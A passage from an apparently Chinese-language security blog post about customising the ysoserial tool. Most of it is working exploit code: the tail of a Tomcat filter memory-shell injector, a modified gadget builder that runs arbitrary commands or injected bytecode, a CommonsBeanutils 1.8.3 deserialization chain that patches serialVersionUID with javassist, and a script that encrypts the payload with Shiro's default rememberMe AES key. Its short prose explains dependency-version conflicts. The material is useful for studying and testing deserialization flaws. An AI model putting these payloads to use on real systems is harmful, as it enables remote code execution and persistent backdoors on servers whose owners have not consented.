class="string">&quot;lastServicedResponse&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">            modifiersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() &amp; -<span class="number">17</span>);</span><br><span class="line">            modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() &amp; -<span class="number">17</span>);</span><br><span class="line">            modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() &amp; -<span class="number">17</span>);</span><br><span class="line">            WRAP_SAME_OBJECT_FIELD.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            lastServicedRequestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            lastServicedResponseField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (!WRAP_SAME_OBJECT_FIELD.getBoolean((Object)<span class="literal">null</span>)) &#123;</span><br><span class="line">                WRAP_SAME_OBJECT_FIELD.setBoolean((Object)<span class="literal">null</span>, <span class="literal">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (lastServicedRequestField.get((Object)<span class="literal">null</span>) == <span class="literal">null</span>) &#123;</span><br><span class="line">                lastServicedRequestField.set((Object)<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (lastServicedResponseField.get((Object)<span class="literal">null</span>) == <span class="literal">null</span>) &#123;</span><br><span class="line">                lastServicedResponseField.set((Object)<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">ServletRequest</span> <span class="variable">servletRequest</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="type">ServletResponse</span> <span class="variable">servletResponse</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            ThreadLocal threadLocal;</span><br><span class="line">            <span class="keyword">if</span> (lastServicedRequestField.get((Object)<span class="literal">null</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                threadLocal = (ThreadLocal)lastServicedRequestField.get((Object)<span class="literal">null</span>);</span><br><span class="line">                servletRequest = (ServletRequest)threadLocal.get();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (lastServicedResponseField.get((Object)<span class="literal">null</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                threadLocal = (ThreadLocal)lastServicedResponseField.get((Object)<span class="literal">null</span>);</span><br><span class="line">                servletResponse = (ServletResponse)threadLocal.get();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (servletRequest != <span class="literal">null</span> &amp;&amp; servletRequest.getServletContext() != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> servletRequest.getServletContext();</span><br><span class="line">                <span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">                appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext)appctx.get(servletContext);</span><br><span class="line">                <span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">                stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext)stdctx.get(applicationContext);</span><br><span class="line">                <span class="type">Field</span> <span class="variable">filterConfigsField</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">                filterConfigsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map)filterConfigsField.get(standardContext);</span><br><span class="line">                <span class="type">String</span> <span class="variable">filterName</span> <span class="operator">=</span> <span class="string">&quot;cmisl&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span> (filterConfigs.get(filterName) == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tomcat_Echo_Evil_Filter$EvilFilter</span>();</span><br><span class="line">                    <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">                    filterDef.setFilterName(filterName);</span><br><span class="line">                    filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">                    filterDef.setFilter(filter);</span><br><span class="line">                    standardContext.addFilterDef(filterDef);</span><br><span class="line">                    <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">                    filterMap.setFilterName(filterName);</span><br><span class="line">                    filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">                    filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">                    standardContext.addFilterMapBefore(filterMap);</span><br><span class="line">                    <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">                    constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">ApplicationFilterConfig</span> <span class="variable">applicationFilterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig)constructor.newInstance(standardContext, filterDef);</span><br><span class="line">                    filterConfigs.put(filterName, applicationFilterConfig);</span><br><span class="line">                    servletResponse.setCharacterEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">                    servletResponse.setContentType(<span class="string">&quot;text/html;charset=utf-8&quot;</span>);</span><br><span class="line">                    servletResponse.getWriter().write(<span class="string">&quot;[+]filter型内存马注入成功&lt;br&gt;&quot;</span>);</span><br><span class="line">                    servletResponse.getWriter().write(<span class="string">&quot;[+]URL:http://localhost:8080/FilterMemoryShell_war_exploded/&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var19) &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>将输出结果base64加密一下</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20240806023717386.png" alt="image-20240806023717386"></p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20240806023820214.png" alt="image-20240806023820214"></p>
<h2 id="serialVersionUID问题"><a href="#serialVersionUID问题" class="headerlink" title="serialVersionUID问题"></a>serialVersionUID问题</h2><h3 id="不同版本依赖问题-serialVersionUID问题"><a href="#不同版本依赖问题-serialVersionUID问题" class="headerlink" title="不同版本依赖问题(serialVersionUID问题)"></a>不同版本依赖问题(serialVersionUID问题)</h3><p> ysoserial 自带的cb链依赖版本是 1.9.2 ，但是我们shiro经常用到1.8.3版本的 commons-beanutils依赖 。由于版本不同，我们使用1.9.2的cb链payload，在存在1.8.3版本的 commons-beanutils依赖的漏洞环境中，由于serialVersionUID不同，反序列化会发生serialVersionUID报错，导致无法成功执行。</p>
<p>如果我们希望ysoserial工具既可以存在1.8.3版本的cb链，也存在1.9.2版本的cb链，就需要通过自定义的 classloader 来打破双亲委派机制，从而实现依赖隔离。</p>
<p>简单来说，Java中的类加载器（ClassLoader）通常会先让父类加载器加载类，这叫“双亲委派机制”。这种机制有时会导致依赖冲突，比如我们需要不同版本的库。为了避免每次修改依赖和重新打包，我们可以自定义一个类加载器，改变默认的类加载方式，让它优先加载特定版本的库，实现依赖隔离，从而纠正serialVersionUID问题。</p>
<h3 id="javassist动态修改serialVersionUID"><a href="#javassist动态修改serialVersionUID" class="headerlink" title="javassist动态修改serialVersionUID"></a>javassist动态修改serialVersionUID</h3><p>将StubTransletPayload替换成CmislTransletPayload</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">CmislTransletPayload</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>Gadgets#createTemplatesImpl</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createTemplatesImpl</span><span class="params">(<span class="keyword">final</span> String command, Class&lt;T&gt; tplClass, Class&lt;?&gt; abstTranslet, Class&lt;?&gt; transFactory)</span></span><br><span class="line">    <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">T</span> <span class="variable">templates</span> <span class="operator">=</span> tplClass.newInstance();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// use template gadget class</span></span><br><span class="line">    <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">    pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(CmislTransletPayload.class));</span><br><span class="line">    pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(abstTranslet));</span><br><span class="line">    <span class="keyword">final</span> <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(CmislTransletPayload.class.getName());</span><br><span class="line">    <span class="comment">// run command in static initializer</span></span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections</span></span><br><span class="line"></span><br><span class="line">    String cmd;</span><br><span class="line">    <span class="keyword">if</span> (command.startsWith(<span class="string">&quot;code:&quot;</span>)) &#123;</span><br><span class="line">        <span class="comment">// 如果命令以 &quot;code:&quot; 开头，直接截取 &quot;code:&quot; 之后的字符串作为代码(cmd)</span></span><br><span class="line">        cmd = command.substring(<span class="number">5</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (command.startsWith(<span class="string">&quot;codebase64:&quot;</span>)) &#123;</span><br><span class="line">        <span class="comment">// 如果命令以 &quot;codebase64:&quot; 开头，截取 &quot;codebase64:&quot; 之后的字符串</span></span><br><span class="line">        <span class="comment">// 解码为字节数组，再转换为字符串，作为代码(cmd)</span></span><br><span class="line">        <span class="type">byte</span>[] decode = <span class="keyword">new</span> <span class="title class_">BASE64Decoder</span>().decodeBuffer(command.substring(<span class="number">11</span>));</span><br><span class="line">        cmd = <span class="keyword">new</span> <span class="title class_">String</span>(decode);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (command.startsWith(<span class="string">&quot;codefile:&quot;</span>)) &#123;</span><br><span class="line">        <span class="comment">// 如果命令以 &quot;codefile:&quot; 开头，截取 &quot;codefile:&quot; 之后的字符串作为文件路径</span></span><br><span class="line">        <span class="comment">// 然后调用 CommonUtils.getCodeFile(codefile) 读取文件内容，将其作为代码(cmd)</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">codefile</span> <span class="operator">=</span> command.substring(<span class="number">9</span>);</span><br><span class="line">        cmd = CommonUtils.getCodeFile(codefile);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (command.startsWith(<span class="string">&quot;classfile:&quot;</span>)) &#123;</span><br><span class="line">        <span class="comment">// 如果命令以 &quot;classfile:&quot; 开头，截取 &quot;classfile:&quot; 之后的字符串作为类文件路径</span></span><br><span class="line">        <span class="comment">// 然后调用 CommonUtils.readClassByte(classfile) 读取类文件的字节码</span></span><br><span class="line">        <span class="comment">// 将字节码注入到 templates 实例的 _bytecodes 字段中，并设置 _name 字段，最后返回 templates 实例</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">classfile</span> <span class="operator">=</span> command.substring(<span class="number">10</span>);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">byte</span>[] classBytes = CommonUtils.readClassByte(classfile);</span><br><span class="line">        Reflections.setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;);</span><br><span class="line">        Reflections.setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Pwnr&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 如果命令不符合上述任何一种前缀，默认将命令作为一个执行命令</span></span><br><span class="line">        <span class="comment">// 使用 Runtime.getRuntime().exec(command) 执行，且对命令中的反斜杠和引号进行转义处理</span></span><br><span class="line">        cmd = <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot;</span> +</span><br><span class="line">            command.replaceAll(<span class="string">&quot;\\\\&quot;</span>, <span class="string">&quot;\\\\\\\\&quot;</span>).replaceAll(<span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\\\&quot;&quot;</span>) +</span><br><span class="line">            <span class="string">&quot;\&quot;);&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">    <span class="comment">// sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)</span></span><br><span class="line">    clazz.setName(<span class="string">&quot;ysoserial.Cmisl&quot;</span> + System.nanoTime());</span><br><span class="line">    <span class="type">CtClass</span> <span class="variable">superC</span> <span class="operator">=</span> pool.get(abstTranslet.getName());</span><br><span class="line">    clazz.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line"><span class="comment">//        CommonUtils.loadClassTest(classBytes);</span></span><br><span class="line">    <span class="comment">//导出文件便于查看javassist构造的恶意Templates</span></span><br><span class="line">    clazz.writeFile(<span class="string">&quot;payload&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// inject class bytes into instance</span></span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;</span><br><span class="line">        classBytes, ClassFiles.classAsBytes(Foo.class)</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// required to make TemplatesImpl happy</span></span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Pwnr&quot;</span>);</span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, transFactory.newInstance());</span><br><span class="line">    <span class="keyword">return</span> templates;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>CommonsBeanutils1_183.java</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtField;</span><br><span class="line"><span class="keyword">import</span> javassist.NotFoundException;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Dependencies;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Gadgets;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.math.BigInteger;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@Dependencies(&#123;&quot;commons-beanutils:commons-beanutils:1.8.3&quot;, &quot;commons-collections:commons-collections:3.1&quot;, &quot;commons-logging:commons-logging:1.2&quot;&#125;)</span></span><br><span class="line"><span class="meta">@Authors(&#123; Authors.FROHOFF,Authors.CMISL &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsBeanutils1_183</span> <span class="keyword">extends</span> <span class="title class_">Object</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Object&gt; &#123;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);</span><br><span class="line">        <span class="comment">// mock method name until armed</span></span><br><span class="line"></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">POOL</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctBeanComparator</span> <span class="operator">=</span> POOL.get(<span class="string">&quot;org.apache.commons.beanutils.BeanComparator&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">CtField</span> <span class="variable">ctSerialVersionUID</span> <span class="operator">=</span> ctBeanComparator.getDeclaredField(<span class="string">&quot;serialVersionUID&quot;</span>);</span><br><span class="line">            ctBeanComparator.removeField(ctSerialVersionUID);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (NotFoundException e)&#123;&#125;</span><br><span class="line"></span><br><span class="line">        ctBeanComparator.addField(CtField.make(<span class="string">&quot;private static final long serialVersionUID = -3490850999041592962L;&quot;</span>,ctBeanComparator));</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> (Comparator)ctBeanComparator.toClass().newInstance();</span><br><span class="line"></span><br><span class="line"><span class="comment">//        final BeanComparator comparator = new BeanComparator(&quot;lowestSetBit&quot;);</span></span><br><span class="line">        <span class="comment">// create queue with numbers and basic comparator</span></span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, (Comparator&lt;? <span class="built_in">super</span> Object&gt;)comparator);</span><br><span class="line">        <span class="comment">// stub data for replacement later</span></span><br><span class="line">        queue.add(<span class="keyword">new</span> <span class="title class_">BigInteger</span>(<span class="string">&quot;1&quot;</span>));</span><br><span class="line">        queue.add(<span class="keyword">new</span> <span class="title class_">BigInteger</span>(<span class="string">&quot;1&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// switch method called by comparator</span></span><br><span class="line">        Reflections.setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// switch contents of queue</span></span><br><span class="line">        <span class="keyword">final</span> Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, <span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        queueArray[<span class="number">0</span>] = templates;</span><br><span class="line">        queueArray[<span class="number">1</span>] = templates;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> queue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        PayloadRunner.run(CommonsBeanutils1_183.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用了javassist技术动态修改serialVersionUID为我们需要的值。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20240810032747114.png" alt="image-20240810032747114"></p>
<blockquote>
<p>加密脚本（因为加密脚本问题踩坑几个小时）</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.govuln.shiroattack;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client1</span> &#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String []args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">     <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">     <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(com.govuln.shiroattack.Evil.class.getName());</span><br><span class="line">     clazz.writeFile(<span class="string">&quot;cmisl&quot;</span>);</span><br><span class="line">     <span class="type">byte</span>[] payloads = <span class="keyword">new</span> <span class="title class_">CommonsBeanutils1Shiro</span>().getPayload(clazz.toBytecode());</span><br><span class="line"></span><br><span class="line">     <span class="type">byte</span>[] test = Base64.getDecoder().decode(<span class="string">&quot;base64data&quot;</span>);</span><br><span class="line"></span><br><span class="line">     <span class="type">AesCipherService</span> <span class="variable">aes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">     <span class="type">byte</span>[] key = java.util.Base64.getDecoder().decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line"></span><br><span class="line">     <span class="type">ByteSource</span> <span class="variable">ciphertext</span> <span class="operator">=</span> aes.encrypt(test, key);</span><br><span class="line">     System.out.printf(ciphertext.toString());</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></blockquote>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">首页</a></li>
        
          <li><a href="/about/">关于</a></li>
        
          <li><a href="/archives/">归档</a></li>
        
          <li><a target="_blank" rel="noopener" href="http://github.com/cmisl">项目</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ysoserial%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-number">1.</span> <span class="toc-text">ysoserial的使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF-ysoserial-%E6%94%AF%E6%8C%81%E8%87%AA%E5%AE%9A%E4%B9%89%E4%BB%A3%E7%A0%81"><span class="toc-number">2.</span> <span class="toc-text">使 ysoserial 支持自定义代码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">2.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0"><span class="toc-number">2.2.</span> <span class="toc-text">实现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95"><span class="toc-number">2.3.</span> <span class="toc-text">测试</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#serialVersionUID%E9%97%AE%E9%A2%98"><span class="toc-number">3.</span> <span class="toc-text">serialVersionUID问题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AC%E4%BE%9D%E8%B5%96%E9%97%AE%E9%A2%98-serialVersionUID%E9%97%AE%E9%A2%98"><span class="toc-number">3.1.</span> <span class="toc-text">不同版本依赖问题(serialVersionUID问题)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#javassist%E5%8A%A8%E6%80%81%E4%BF%AE%E6%94%B9serialVersionUID"><span class="toc-number">3.2.</span> <span class="toc-text">javassist动态修改serialVersionUID</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/08/06/ysoserial%E7%B3%BB%E5%88%97(2)%E2%80%94%E2%80%94%E7%AE%80%E5%8D%95%E4%BA%8C%E5%BC%80/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
